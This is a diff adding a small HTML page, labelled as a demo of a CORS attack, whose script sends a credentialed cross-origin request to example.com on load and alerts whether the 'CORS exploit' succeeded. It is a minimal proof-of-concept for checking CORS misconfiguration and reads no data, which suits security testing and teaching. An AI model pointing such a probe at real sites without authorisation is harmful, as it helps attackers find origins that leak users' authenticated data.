@@ -1,0 +1,30 @@
+<html>
+<head>
+	<script type = "text/javascript">
+		function makeRequest(method,url)
+		{
+			xmlhttprequest = new XMLHttpRequest();
+			xmlhttprequest.onreadystatechange = function(){
+				if(xmlhttprequest.readyState == 4)
+				{
+					if(xmlhttprequest.status == 200)
+					{
+						alert("CORS Exploit on"+url+" succedded");
+					}
+					else
+					{
+						alert("CORS Exploit on"+url+" failed");
+					}
+				}
+			}
+			xmlhttprequest.open(method,url,true);
+			xmlhttprequest.withCredentials = true;
+			xmlhttprequest.send();
+		}
+
+		makeRequest("GET","http://example.com");	</script>
+</head>
+<body>
+To demo the CORS attack.
+</body>
+</html>
